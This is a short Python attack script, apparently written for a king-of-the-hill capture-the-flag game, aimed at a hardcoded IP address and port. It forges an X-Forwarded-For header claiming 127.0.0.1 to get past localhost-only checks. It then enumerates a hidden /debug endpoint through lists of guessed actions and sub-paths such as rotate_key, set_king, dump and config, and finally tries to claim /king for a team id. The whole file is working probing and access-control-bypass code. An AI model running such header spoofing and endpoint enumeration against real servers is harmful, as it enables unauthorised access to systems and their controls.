import requests
B="http://13.37.197.230:28490"; TEAM="842d0f131b6b020f"
s=requests.Session()
XFF={"X-Forwarded-For":"127.0.0.1"}

def req(method,path,**kw):
    h=dict(XFF); h.update(kw.pop("headers",{}))
    r=s.request(method,B+path,headers=h,timeout=10,**kw)
    return r.status_code, r.text[:400], dict((k,r.headers[k]) for k in ("Allow",) if k in r.headers)

print("OPTIONS /debug:", req("OPTIONS","/debug"))
print("GET /debug:", req("GET","/debug"))
print("POST /debug (empty):", req("POST","/debug"))
print()
# query-param actions
for a in ["help","list","rotate","rotate_key","newkey","reset","king","set_king","freeze","lock","status","dump","config","ops"]:
    code,body,_=req("GET","/debug",params={"action":a})
    if not (code==200 and '"hill_key"' in body and a not in body):
        print(f"GET /debug?action={a}: [{code}] {body}")
print()
# sub-paths under /debug
for sp in ["/debug/help","/debug/rotate","/debug/key","/debug/king","/debug/set_king",
           "/debug/freeze","/debug/reset","/debug/config","/debug/ops","/debug/status",
           "/debug/claims","/debug/log","/debug/teams"]:
    code,body,_=req("GET",sp)
    print(f"GET {sp}: [{code}] {body}")
print()
# /king with XFF, GET and POST
print("GET /king (xff):", req("GET","/king"))
print("POST /king (xff):", req("POST","/king",json={"team":TEAM}))
